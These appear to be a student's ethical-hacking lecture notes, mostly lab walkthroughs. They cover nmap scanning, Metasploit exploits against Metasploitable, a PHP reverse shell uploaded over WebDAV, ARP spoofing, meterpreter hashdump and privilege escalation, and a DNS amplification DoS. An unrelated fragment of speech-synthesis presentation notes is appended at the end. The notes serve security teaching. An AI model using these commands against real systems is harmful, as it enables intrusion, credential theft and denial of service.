# Ethical Hacking Unit 1 Lecture 1

- We can use `nmap` to find all the live hosts in a network. Eg `nmap -T4 -sP 10.35.1.0/24`
- We can use `netdiscover` to find all the live hosts in a network. Eg `netdiscover`


## Performing OS Scan

```bash
nmap -T4 -O <IP Address>
```

## Performing Port Scan

Example of scanning first thousand ports. In real life we need to scan all ports `0 - 65535`

```bash
nmap -T4 -p 0-1000 <IP Address>
```

## Performing Service Scan

```bash
nmap -T4 -sV <IP Address> 
```

## Performing Vulnerability Scanning

In order to perform vulnerability scan we use the tool `Nessus`

```bash
nmap -T4 --script vuln <IP Address>
```


## Exploiting the Machine

To exploit the machines we use the framework `Metasploit`.


### Terminologies

1. **Vulnerability** : A weakness that can be exploited by an attacker to perform unauth actions with a computer system. Eg : Buffer overflow, weak passwords etc.

2. **Exploit** : A piece of code or chunk of data or sequence of commands that take benefit of the vulnerabilities on a system to perform unauth actions, priviledge escalation etc.

3. **Payload** : 


### Metasploit

**Step 1**

To start the metasploit framework we use the command 

```bash
msfconsole
```

**Help Command**
This will help us get all the available commands in Metasploit

```bash
help
```

**See all Payloads on Metsaploit frameworks**

```bash
show payloads
```

**See all Exploits on Metsaploit frameworks**

```bash
show exploits
```

**To search if any exploit is present with a given name**

```bash
search <expoit-name>
```

**Using an Exploit**

```bash
use <Exploit-fullname>
```

This will then show the command line change to reflect the exploit stuff.

**Checking Which parameter to set in Exploit & Setting it**

```bash
show options
```

Now to set it

```bash
set <OPTION-NAME> <IP Address>
```

Eg : `set RHOST 10.35.1.150`


**Setting port**

```bash
set <OPTION NAME> <PORT NUMBER>
```

eg : `set RPORT 445`

This port must be set using the info we found while looking for port scans


**Step 2 : Exploiting the system**

To exploit the system we can use the command `exploit` or `run`

```bash
exploit
```

Now we will be in the target machine.


**Step 3 : Getting Details**


1. Getting the information of target machine

```bash
sysinfo
```

2. Using the command `help` we can check all the available commands in the machine session Eg : here meterpeter session.



# Ethical Hacking Unit 1 Lecture 2

## Metasploitable

username and password both are `msfadmin`

## Scanning all ports and services

```bash
nmap -p- -sV <IP Address>
```

Once we have all the services and and ports scanned we begin with one vulnerability. Here example `vsftpd` is a vulnerable version.

We can do a search is `metasploit` to see if the version is vulnerable or not and the either use exploit command or directly `use <Exploit number in search command>`

```bash
use 0
```

To get more information on the exploit

```bash
info
```

## Configuring the options (IP and Port)

```bash
set RHOSTS <VICTIM IP Address>
```

```bash
set RPORT 21
```

## Running the Exploit

```bash
exploit
```

Voila! You are in the machine.

## Another Website based Excersie


### Step 1 : Open web browser on Kali and type the `http://<Victim IP Address>`

### Step 2 : Select `WebDAV`

### Step 3 : Search for a PHP reverse shell on ur Kali linux web browser and get the snippet from github

### step 4 : We shall upload this malicious file to the target machine

1. Set the IP address of your machine in this file
2. Change the Port number in the file

### step 5 : Using Cadaver command to Upload for file in the server by establishing connection

```bash
cadaver http://10.0.2.4/dav
```

### step 6 : `put <filepath>`

then type `exit` once the uppload is show successfully

### Step 7 : Running listner to capture the shell

In the `msf6` console we will use a payload called multi/handler

```bash
use multi/handler
```

### Step 8 : Set LHOST and LPORT

```bash
set LHOST <Attacker IP Address>
```

```bash
set LHOST <PORT>
```

```bash
show options # confirm settings
```

### Step 9 : Run exploit as a Background Job

```
run -j
```

### Step 10 : In other terminal curl (same terminal where upload did)

```bash
curl http://10.0.2.4/dav/exploit.php
```

### Step 11 : Entering session

Once the other terminal after `curl` says that session open then in the msf console

```bash
session <session number shown>
```

when we type the command `whoami` it shows `www-data` since WebDAV runs through that.




# Ethical Hacking Unit 1 Lecture 1


## Man in The Middle Attack

We shall be trying `ARP Poisoning` / `ARP Spoofing`

### ARP : Address Resolution Protocol

Stateless protocol used for resolving IP address to MAC Address.

ARP table me mac address nhi milega then this request is broadcasted to the network

Once its obtained it is then stored in its ARP table


### What is ARP Spoofing ?

ARP packets can be forced to send data to attacker machine. Wireshark can be used to sniff packets.

### Check portforwarding enaled or not

```bash
cat /proc/sys/net/ipv4/ip_forward # If this outputs 0 then run the below command

echo 1 > /proc/sys/net/ipv4/ip_forward

cat /proc/sys/net/ipv4/ip_forward
```

### spoof

```bash
arspoof -t 10.35.1.199 10.35.1.2
```


In another terminal

```bash
arspoof -t 10.35.1.2 10.35.1.199
```


## Social Engineering Attack

```bash
msfvenom
```


## System Software Vulnerabilities & Application Software Vulnerabilities

```
getuid
```

```
getsystem
```

```
hashdump
```

```
ps
```

```
migrate <Pid>
```

```
sessions
```

To get Admin prvileges

```
search bypassuac
```

# Ethical Hacking Unit 1 Lecture 5


## Wireshark


dig, curl, nmap commands

## OSI Model

In the OSI reference model, the communications between a computing system are split into seven different abstraction layers: Physical, Data Link, Network, Transport, Session, Presentation, and Application.


## PCAP / TCAP ? she said one que will definitely be there ? Find out the pcap file ?


# Ethical Hacking Unit 1 Lecture 5


## Nessus

### New Scan : Has many options available

1. Let's say we use `advanced scan`
2. Put the name of the scan
3. In the Target put the `<Target IP Address>` as a comma sep list
4. Set all options for discovery and other settings
5. Port Scanning part

## Metasploit 

### Finding all live hosts

```bash
nmap -T4 -sP <IP Address>/24
```

or we can use 

```bash
netdiscover
```

### Select a host to target

Eg: We take <IP>

### Perform Port Scan

```bash
nmap -T4 -p 0-1000 <IP>
```

### Service Scan

```bash
nmap -T4 -sV <IP>
```

### OS Scan

```bash
nmap -T4 -O <IP>
```

### Vulnerability Scan perform (Can use Nessus)

```bash
nmap -T4 --script vuln <IP>
```

Now check the result for vulnerabilites in the target machine


### Start Exploitation with Metasploit

We use `Metasploit` for exploitation. Start the metasploit

```bash
msfconsole
```

### Helpful commands

```bash
$ help
$ show payloads
$ show exploiys
$ show encoders
```

### Search for Available exploits based on vulnerability found

```bash
search <string>
```

### Exploit the target system

```bash
use <Exploit name>
```

### Setting parameters

Checking params
```bash
show options
```

```bash
set RHOST <IP>
```

<!-- MAYBEEEEE -->
```bash
set RPORT <port-num> 
```

The port must be set based on the info from scanning phase. The open port must be set here.

Now exploiting the system:

```bash
exploit
```

### Getting info on Target machine

```bash
sysinfo
```

Checking available commands in this session

```bash
help
```

# Ethical Hacking Unit 1 Lecture Sept 8


### DNS Poisoning



### Securing mails


### recon-ng

```bash
sudo recon-ng
```

```bash
marketplace install all
```

```bash
modules load recon/domains-hosts/brute_hosts
```

```bash
info
```

```bash
db insert domains <domain name>~
```

```bash
show domains
```

```bash
run
```

```bash
host google.co.uk
```

```bash
dig google.co.uk SOA
```

```bash
dig @192.168.19.139 nsa.gov
```

```bash
sudo nmap 192.168.19.139 -sU -p 53 
```

```bash
dig @192.168.19.139 chaos version.bind txt
```

Searching exploits
```bash
searchsploit bind
```

### We will try DoS attack

```bash
msfconsole
```

This is based on the info we got from the exploit exploration for bind n stuff
```bash
search tkey
```

```bash
use <exploit number>
```

```bash
show info
```

Set RHOSTS and stuff

```bash
run
```

```bash
sudo nmap 192.168.19.139 -sU -p 53 
```


# Ethical Hacking Unit 1 Lecture Sept 9

* MUA : Mail User Agents
* MTA : Mail Transfer Agents
* MDA : Mail Delivery Agents
* SMTP : Simple Mail Transfer Protocol(Operates on TCP ports 25 and 587)
* POP : Post Office Protocol
* IMAP : Internet Message Access Protocol (Port 143 & 993)


* Metadata of the email contains the data of the journey of the mail from sender to receiver

* It is usually hidden and can be viewed from original message


* DSN : Delivery Status Notifications
* SPF : Sender Policy Framework

## NetCat

Probing the SMTP Service

```bash
nc <Target IP Address> <Port>
```

## Mail Servers

* EXIM
* Sendmail
* Cyrus
* PHP Mail
* Webmail

## Brute Forcing Post Office

We use the tool `Hydra`

## the Heartbleed Bug


## DNS Demo

The IP Address used here is of dns server

```bash
dig @192.168.19.139 AXFR nsa.gov
```

```bash
fierce --dns-servers 192.168.19.139 --domain nsa.gov
```

### DNS Traffic Amplification

```bash
sudo nmap 192.168.19.139 -sU -p 53
```

```bash
dig @192.168.19.139 chaos version.bind txt
```

This will give a list of possible DoS attacks
```bash
searchsploit isc bind
```

Now, we use DNS Amplification attack

```bash
msfconsole
```

```bash
search dns_amp
```

```bash
use 0
```

```bash
info
```

```bash
set DOMAINNAME nsa.gov
```

Check RPORT if it is the same as the one we found in the nmap scan.

```bash
set RHOSTS 192.168.19.139
```

```bash
run
```

Checking if DNS server is on or lost (in other terminal)

```bash
sudo nmap 192.168.19.139 -sU -p 53
```





8) The vocoder is used to generate audio output from the mel-spectrogram. Its based on wavenet model. Since the
the conversion is lossy, it requires a model dedicated to this conversion.

next

9) following are the adv of using this method:
all the 3 models can be trained independently

the synthesizer conditioned on these features helps us retain human like voice features on the audio.

generation of audio sample with the minimal length audio sample is possible. the model doesnt require
minutes of audio.

next


10) following are the drawbacks and difficulties faced:
Generating feature vector is difficult and requires much more work on it.
Generating appropriate pauses is difficult. 
now lets look at project demonstration.